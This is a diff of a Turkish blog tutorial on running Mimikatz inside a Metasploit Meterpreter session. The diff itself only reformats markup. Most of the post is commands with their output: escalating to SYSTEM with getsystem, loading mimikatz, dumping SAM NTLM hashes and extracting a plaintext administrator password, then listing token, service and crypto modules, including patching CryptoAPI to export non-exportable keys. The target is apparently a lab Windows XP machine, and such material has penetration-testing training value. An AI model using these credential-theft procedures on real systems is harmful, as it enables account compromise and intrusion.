@@ -29,107 +29,107 @@ title: MSF Mimikatz
 url: /tr/msf-mimikatz/
 ---
 
- <p>Metasploit Framework, çok yönlü kullanım imkanları sağlamaktadır. Bu sebeple, harici kaynaklardan kodları da sistem içine dahil etmek mümkündür. Bu yazımızda, mimikatz uygulamasının Metasploit Framework içinde kullanımı ile ilgili örneklere bakacağız.</p>
+ <p>Metasploit Framework, çok yönlü kullanım imkanları sağlamaktadır. Bu sebeple, harici kaynaklardan kodları da sistem içine dahil etmek mümkündür. Bu yazımızda, mimikatz uygulamasının Metasploit Framework içinde kullanımı ile ilgili örneklere bakacağız.
  
 
 <!-- wp:heading {"level":1} -->
 <h1 class="wp-block-heading" id="mimikatz-nedir">Mimikatz nedir? 
 <!-- /wp:heading -->
 
- <p>Mimikatz, esasında Benjamin Delpy tarafından yazılan bir post-exploitation programıdır. Hedef bilgisayardan bilgi toplama için kullanılır. Mimikatz, bilgi toplama için gerekli bir çok farklı komutu bünyesinde toplamıştır.</p>
+ <p>Mimikatz, esasında Benjamin Delpy tarafından yazılan bir post-exploitation programıdır. Hedef bilgisayardan bilgi toplama için kullanılır. Mimikatz, bilgi toplama için gerekli bir çok farklı komutu bünyesinde toplamıştır.
  
 
 <!-- wp:heading {"level":1} -->
 <h1 class="wp-block-heading" id="mimikatz-yükleme">Mimikatz Yükleme 
 <!-- /wp:heading -->
 
- <p>Mimikatz, hedef sistemde bir Meterpreter oturumu açtıktan sonra çalıştırılabilir. Sisteme herhangi bir dosya yüklemeye gerek kalmadan hafıza üzerinde çalışır. Etkin olarak çalışabilmesi için SYSTEM seviyesinde oturum yetkilerine sahip olmamız gerekir.</p>
+ <p>Mimikatz, hedef sistemde bir Meterpreter oturumu açtıktan sonra çalıştırılabilir. Sisteme herhangi bir dosya yüklemeye gerek kalmadan hafıza üzerinde çalışır. Etkin olarak çalışabilmesi için SYSTEM seviyesinde oturum yetkilerine sahip olmamız gerekir.
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> getuid
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  getuid
 Server username: WINXP-E95CE571A1\Administrator
 </code></pre>
 <!-- /wp:code -->
 
- <p>Bu çıktıda, hedef sistemde SYSTEM seviyesinde olmadığımız görülmektedir. Öncelikle SYSTEM seviyesine geçmeye çalışalım.</p>
+ <p>Bu çıktıda, hedef sistemde SYSTEM seviyesinde olmadığımız görülmektedir. Öncelikle SYSTEM seviyesine geçmeye çalışalım.
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> getsystem
-...got system <strong>(</strong>via technique 1<strong>)</strong>.
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  getsystem
+...got system ***(*** via technique 1***)*** .
 
-meterpreter <strong>&gt;</strong> getuid
+meterpreter ***&gt;***  getuid
 Server username: NT AUTHORITY\SYSTEM
 </code></pre>
 <!-- /wp:code -->
 
- <p>Başarılı olduysanız yukarıdaki gibi SYSTEM seviyesine geçtiğinize dair çıktı alırsınız.</p>
+ <p>Başarılı olduysanız yukarıdaki gibi SYSTEM seviyesine geçtiğinize dair çıktı alırsınız.
  
 
- <p>Mimikatz, 32-bit ve 64-bit mimarilerde çalışmak üzere tasarlanmıştır. SYSTEM seviyesine geçtikten sonra hedef sistemin mimarisinin ne olduğuna&nbsp;<code>sysinfo</code>&nbsp;komutuyla bakmalıyız. Bazen, Meterpreter oturum 64-bit mimaride çalışan bir 32-bit mimari prosesinde oturum açmış olabilir. Bu durumda mimikatz’ın bazı özellikleri çalışmayacaktır. Meterpreter oturumu 32-bit bir proseste çalışıyorsa (Mimari aslında 64-bit olmasına rağmen), mimikatz, 32-bit için yazılımları kullanmaya çalışacaktır. Bunun önüne geçmenin yolu&nbsp;<code>ps</code>&nbsp;komutuyla çalışan proseslere bakmak ve&nbsp;<code>migrate</code>&nbsp;komutuyla başka bir prosese geçmektir.</p>
+ <p>Mimikatz, 32-bit ve 64-bit mimarilerde çalışmak üzere tasarlanmıştır. SYSTEM seviyesine geçtikten sonra hedef sistemin mimarisinin ne olduğuna&nbsp;<code>sysinfo</code>&nbsp;komutuyla bakmalıyız. Bazen, Meterpreter oturum 64-bit mimaride çalışan bir 32-bit mimari prosesinde oturum açmış olabilir. Bu durumda mimikatz’ın bazı özellikleri çalışmayacaktır. Meterpreter oturumu 32-bit bir proseste çalışıyorsa (Mimari aslında 64-bit olmasına rağmen), mimikatz, 32-bit için yazılımları kullanmaya çalışacaktır. Bunun önüne geçmenin yolu&nbsp;<code>ps</code>&nbsp;komutuyla çalışan proseslere bakmak ve&nbsp;<code>migrate</code>&nbsp;komutuyla başka bir prosese geçmektir.
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> sysinfo
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  sysinfo
 Computer        : WINXP-E95CE571A1
-OS              : Windows XP <strong>(</strong>Build 2600, Service Pack 3<strong>)</strong>.
+OS              : Windows XP ***(*** Build 2600, Service Pack 3***)*** .
 Architecture    : x86
 System Language : en_US
 Meterpreter     : x86/win32
 </code></pre>
 <!-- /wp:code -->
 
- <p>Burada görülen çıktıda, hedef makinenin zaten 32-bit mimaride olduğunu görüyoruz. O zaman, 32-bit, 64-bit çakışması bulunmamaktadır. Artık&nbsp;<code>mimikatz</code>&nbsp;modülünü yükleyebiliriz.</p>
+ <p>Burada görülen çıktıda, hedef makinenin zaten 32-bit mimaride olduğunu görüyoruz. O zaman, 32-bit, 64-bit çakışması bulunmamaktadır. Artık&nbsp;<code>mimikatz</code>&nbsp;modülünü yükleyebiliriz.
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> load mimikatz
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  load mimikatz
 Loading extension mimikatz...success.
 </code></pre>
 <!-- /wp:code -->
 
- <p>Yükleme başarıyla tamamlandıktan sonra öncelikle yardım bilgisini görüntüleyelim.</p>
+ <p>Yükleme başarıyla tamamlandıktan sonra öncelikle yardım bilgisini görüntüleyelim.
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> help mimikatz
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  help mimikatz
 
 Mimikatz Commands
-<strong>=================</strong>
+***=================*** 
 
     Command           Description
     -------           -----------
     kerberos          Attempt to retrieve kerberos creds
     livessp           Attempt to retrieve livessp creds
     mimikatz_command  Run a custom commannd
-    msv               Attempt to retrieve msv creds <strong>(</strong>hashes<strong>)</strong>
+    msv               Attempt to retrieve msv creds ***(*** hashes***)*** 
     ssp               Attempt to retrieve ssp creds
     tspkg             Attempt to retrieve tspkg creds
     wdigest           Attempt to retrieve wdigest creds
 </code></pre>
 <!-- /wp:code -->
 
- <p>Mimikatz, temel olarak yukarıdaki komutları kullanmamızı sağlarsa da içlerinde en güçlüsü&nbsp;<code>mimikatz_command</code>&nbsp;seçeneğidir.</p>
+ <p>Mimikatz, temel olarak yukarıdaki komutları kullanmamızı sağlarsa da içlerinde en güçlüsü&nbsp;<code>mimikatz_command</code>&nbsp;seçeneğidir.
  
 
- <p>Öncelikle mimikatz sürümünü kontrol edelim.</p>
+ <p>Öncelikle mimikatz sürümünü kontrol edelim.
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> mimikatz_command -f version
-mimikatz 1.0 x86 <strong>(</strong>RC<strong>)</strong> <strong>(</strong>Nov  7 2013 08:21:02<strong>)</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  mimikatz_command -f version
+mimikatz 1.0 x86 ***(*** RC***)***  ***(*** Nov  7 2013 08:21:02***)*** 
 </code></pre>
 <!-- /wp:code -->
 
- <p>Mimikatz’ın sağladığı bir takım modüller bulunur. Bu modüllerin listesini görmek için sistemde bulunmayan bir modül ismi vermeniz yeterlidir. Bu durumda mimikatz size kullanılabilir modüllerin listesini verecektir. Komut kullanımında&nbsp;<code>modüladı::</code>&nbsp;kullanım formatına dikkat edin.</p>
+ <p>Mimikatz’ın sağladığı bir takım modüller bulunur. Bu modüllerin listesini görmek için sistemde bulunmayan bir modül ismi vermeniz yeterlidir. Bu durumda mimikatz size kullanılabilir modüllerin listesini verecektir. Komut kullanımında&nbsp;<code>modüladı::</code>&nbsp;kullanım formatına dikkat edin.
  
 
- <p>Aşağıdaki örnekte,&nbsp;<code>fu::</code>&nbsp;modülü istenmiştir. Böyle bir modül olmadığından kullanılabilir tüm modülleri listelemiş olduk.</p>
+ <p>Aşağıdaki örnekte,&nbsp;<code>fu::</code>&nbsp;modülü istenmiştir. Böyle bir modül olmadığından kullanılabilir tüm modülleri listelemiş olduk.
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> mimikatz_command -f fu::
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  mimikatz_command -f fu::
 Module : 'fu' introuvable
 
 Modules disponibles : 
@@ -155,7 +155,7 @@ Modules disponibles :
 </code></pre>
 <!-- /wp:code -->
 
- <p>Bu listede bulunan modüllerin kullanılabilir seçeneklerini listelemek için modül ismini vererek girilen komut aşağıdaki formatta kullanılmaktadır.</p>
+ <p>Bu listede bulunan modüllerin kullanılabilir seçeneklerini listelemek için modül ismini vererek girilen komut aşağıdaki formatta kullanılmaktadır.
  
 
 <!-- wp:code -->
@@ -170,18 +170,18 @@ Description du module : Fonctions diverses n'ayant pas encore assez de corps pou
 </code></pre>
 <!-- /wp:code -->
 
- <p>Gördüğünüz gibi&nbsp;<code>drivers</code>&nbsp;modülünün,&nbsp;<code>noroutemon, eventdrop, cancelator, secrets</code>&nbsp;seçenekleri bulunmaktadır.</p>
+ <p>Gördüğünüz gibi&nbsp;<code>drivers</code>&nbsp;modülünün,&nbsp;<code>noroutemon, eventdrop, cancelator, secrets</code>&nbsp;seçenekleri bulunmaktadır.
  
 
 <!-- wp:heading {"level":1} -->
 <h1 class="wp-block-heading" id="ram-hafızadan-hash-ve-parola-okuma">RAM Hafızadan Hash ve Parola Okuma 
 <!-- /wp:heading -->
 
- <p>RAM hafızadan Hash değerlerini ve parolaları okumak için Metasploit Framework’ün sağladığı kendi komutlarını kullanabileceğimiz gibi&nbsp;<code>mimikaz</code>&nbsp;modüllerini de kullanabiliriz.</p>
+ <p>RAM hafızadan Hash değerlerini ve parolaları okumak için Metasploit Framework’ün sağladığı kendi komutlarını kullanabileceğimiz gibi&nbsp;<code>mimikaz</code>&nbsp;modüllerini de kullanabiliriz.
  
 
  
-<h2 class="wp-block-heading" id="metasploit-komutları-ile-bilgi-elde-etme">Metasploit Komutları ile Bilgi Elde etme</h2>
+<h2 class="wp-block-heading" id="metasploit-komutları-ile-bilgi-elde-etme">Metasploit Komutları ile Bilgi Elde etme
 <!-- /wp:heading -->
 
 <!-- wp:code -->
@@ -216,11 +216,11 @@ AuthID   Package    Domain           User              Password
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="mimikatz-modülleri-ile-bilgi-elde-etme">Mimikatz Modülleri ile Bilgi Elde Etme</h2>
+<h2 class="wp-block-heading" id="mimikatz-modülleri-ile-bilgi-elde-etme">Mimikatz Modülleri ile Bilgi Elde Etme
 <!-- /wp:heading -->
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> mimikatz_command -f samdump::hashes
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  mimikatz_command -f samdump::hashes
 Ordinateur : winxp-e95ce571a1
 BootKey    : 553d8c1349162121e2a5d3d0f571db7f
 
@@ -244,8 +244,8 @@ User : SUPPORT_388945a0
 LM   : 
 NTLM : 771ee1fce7225b28f8aec4a88aea9b6a
 
-meterpreter <strong>&gt;</strong> mimikatz_command -f sekurlsa::searchPasswords
-<strong>[</strong>0] <strong>{</strong> Administrator ; WINXP-E95CE571A1 ; SuperSecretPassword <strong>}</strong>
+meterpreter ***&gt;***  mimikatz_command -f sekurlsa::searchPasswords
+***[*** 0] ***{***  Administrator ; WINXP-E95CE571A1 ; SuperSecretPassword ***}*** 
 </code></pre>
 <!-- /wp:code -->
 
@@ -253,19 +253,19 @@ meterpreter <strong>&gt;</strong> mimikatz_command -f sekurlsa::searchPasswords
 <h1 class="wp-block-heading" id="diğer-modüller">Diğer Modüller 
 <!-- /wp:heading -->
 
- <p>Yukarıda örnek olarak gösterilen modüllerin haricinde başka modüllerde bulunur. Bunların tamamını&nbsp;<a href="http://blog.gentilkiwi.com/">Mimikatz</a>&nbsp;web sayfasından inceleyebilirsiniz.</p>
+ <p>Yukarıda örnek olarak gösterilen modüllerin haricinde başka modüllerde bulunur. Bunların tamamını&nbsp;<a href="http://blog.gentilkiwi.com/">Mimikatz</a>&nbsp;web sayfasından inceleyebilirsiniz.
  
 
  
-<h2 class="wp-block-heading" id="kullanıcı-token-bilgileri">Kullanıcı Token Bilgileri</h2>
+<h2 class="wp-block-heading" id="kullanıcı-token-bilgileri">Kullanıcı Token Bilgileri
 <!-- /wp:heading -->
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> mimikatz_command -f handle::
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  mimikatz_command -f handle::
 Module : 'handle' identifié, mais commande '' introuvable
 
 Description du module : Manipulation des handles
-list              - Affiche les handles du système <strong>(</strong>pour le moment juste les processus et tokens<strong>)</strong>
+list              - Affiche les handles du système ***(*** pour le moment juste les processus et tokens***)*** 
 processStop       - Essaye de stopper un ou plusieurs processus en utilisant d'autres handles
 tokenImpersonate  - Essaye d'impersonaliser un token en utilisant d'autres handles
 nullAcl           - Positionne une ACL null sur des Handles
@@ -290,14 +290,14 @@ meterpreter &gt; mimikatz_command -f handle::list
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="windows-servisleri-i̇şlemleri">Windows Servisleri İşlemleri</h2>
+<h2 class="wp-block-heading" id="windows-servisleri-i̇şlemleri">Windows Servisleri İşlemleri
 <!-- /wp:heading -->
 
- <p>Mimikatz, Windows servislerini başlatma, durdurma ve kaldırma imkanı da sağlamaktadır. Servis modülüne ve seçeneklerine bakalım.</p>
+ <p>Mimikatz, Windows servislerini başlatma, durdurma ve kaldırma imkanı da sağlamaktadır. Servis modülüne ve seçeneklerine bakalım.
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> mimikatz_command -f service::
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  mimikatz_command -f service::
 Module : 'service' identifié, mais commande '' introuvable
 
 Description du module : Manipulation des services
@@ -309,16 +309,16 @@ Description du module : Manipulation des services
 </code></pre>
 <!-- /wp:code -->
 
- <p>Bu seçeneklerden, listeleme modülünü kullanalım.</p>
+ <p>Bu seçeneklerden, listeleme modülünü kullanalım.
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> mimikatz_command -f service::list
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  mimikatz_command -f service::list
 ...snip...
         WIN32_SHARE_PROCESS     STOPPED RemoteRegistry  Remote Registry
-        KERNEL_DRIVER   RUNNING RFCOMM  Bluetooth Device <strong>(</strong>RFCOMM Protocol TDI<strong>)</strong>
-        WIN32_OWN_PROCESS       STOPPED RpcLocator      Remote Procedure Call <strong>(</strong>RPC<strong>)</strong> Locator
-  980   WIN32_OWN_PROCESS       RUNNING RpcSs   Remote Procedure Call <strong>(</strong>RPC<strong>)</strong>
+        KERNEL_DRIVER   RUNNING RFCOMM  Bluetooth Device ***(*** RFCOMM Protocol TDI***)*** 
+        WIN32_OWN_PROCESS       STOPPED RpcLocator      Remote Procedure Call ***(*** RPC***)***  Locator
+  980   WIN32_OWN_PROCESS       RUNNING RpcSs   Remote Procedure Call ***(*** RPC***)*** 
         WIN32_OWN_PROCESS       STOPPED RSVP    QoS RSVP
   760   WIN32_SHARE_PROCESS     RUNNING SamSs   Security Accounts Manager
         WIN32_SHARE_PROCESS     STOPPED SCardSvr        Smart Card
@@ -332,29 +332,29 @@ Description du module : Manipulation des services
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="kripto-modülü">Kripto Modülü</h2>
+<h2 class="wp-block-heading" id="kripto-modülü">Kripto Modülü
 <!-- /wp:heading -->
 
- <p>Mimikatz’ın sağladığı kripto modülüne ve seçeneklerine bakalım.</p>
+ <p>Mimikatz’ın sağladığı kripto modülüne ve seçeneklerine bakalım.
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> mimikatz_command -f crypto::
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  mimikatz_command -f crypto::
 Module : 'crypto' identifié, mais commande '' introuvable
 
 Description du module : Cryptographie et certificats
-listProviders   - Liste les providers installés<strong>)</strong>
+listProviders   - Liste les providers installés***)*** 
   listStores    - Liste les magasins système
 listCertificates        - Liste les certificats
     listKeys    - Liste les conteneurs de clés
 exportCertificates      - Exporte les certificats
   exportKeys    - Exporte les clés
-    patchcng    - <strong>[</strong>experimental] Patch le gestionnaire de clés pour l'export de clés non exportable
+    patchcng    - ***[*** experimental] Patch le gestionnaire de clés pour l'export de clés non exportable
    patchcapi    - [experimental] Patch la CryptoAPI courante pour l'export de clés non exportable
 </code></pre>
 <!-- /wp:code -->
 
- <p>Bu seçeneklerden&nbsp;<code>listProviders</code>&nbsp;seçeneğini kullanalım.</p>
+ <p>Bu seçeneklerden&nbsp;<code>listProviders</code>&nbsp;seçeneğini kullanalım.
  
 
 <!-- wp:code -->
@@ -375,5 +375,5 @@ Providers CryptoAPI :
 </code></pre>
 <!-- /wp:code -->
 
- <p>Yukarıdaki örneklerden göreceğiniz gibi, Mimikatz’a ait modüller ve bu modüllerin seçenekleri bulunuyor. Çok geniş ihtimaller dahilinde kullanabileceğiniz komutları tek tek deneyerek tecrübe kazanmanızı tavsiye ediyorum.</p>
+ <p>Yukarıdaki örneklerden göreceğiniz gibi, Mimikatz’a ait modüller ve bu modüllerin seçenekleri bulunuyor. Çok geniş ihtimaller dahilinde kullanabileceğiniz komutları tek tek deneyerek tecrübe kazanmanızı tavsiye ediyorum.
  
